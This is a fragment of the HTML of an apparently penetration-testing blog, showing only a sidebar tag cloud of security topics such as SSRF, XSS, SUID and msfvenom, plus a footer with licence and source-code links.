            <li class="tag tag-4">
              <a href="../../tag/enumeration.html">enumeration</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/bludit.html">bludit</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lxd.html">lxd</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/security.html">security</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/suid.html">SUID</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/azure.html">Azure</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/vulnhub.html">vulnhub</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/javascript.html">javascript</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nft.html">NFT</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/vb.html">VB</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/boot2root.html">boot2root</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ssrf.html">SSRF</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/dll.html">DLL</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/jackson.html">jackson</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/john.html">john</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/teamviewer.html">teamviewer</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/rsa.html">RSA</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/impacket.html">impacket</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/git.html">git</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/path.html">PATH</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/adb.html">adb</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/openadmin.html">openAdmin</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/jwt.html">jwt</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/misc.html">misc</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/xss.html">XSS</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/php.html">php</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/phs.html">PHS</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/net.html">.NET</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/web.html">web</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/composer.html">composer</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/deserialization.html">deserialization</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/core-dump.html">core dump</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/crypto.html">Crypto</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/strapi.html">strapi</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/msfvenom.html">msfvenom</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/cve.html">CVE</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/umbraco.html">umbraco</a>
            </li>
    </ul>
</section>

            </div>
        </aside>
    </div>

    <section class="pure-g-r footer">
<div class="pure-u-2-3 copyright">
    <p class="l-box">
        The content of this blog in under
        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.

        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
    </p>
</div>

<div class="pure-u-1-3 credits">
    <p class="l-box">
        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
    </p>
</div>    </section>


</div>
</body>
</html>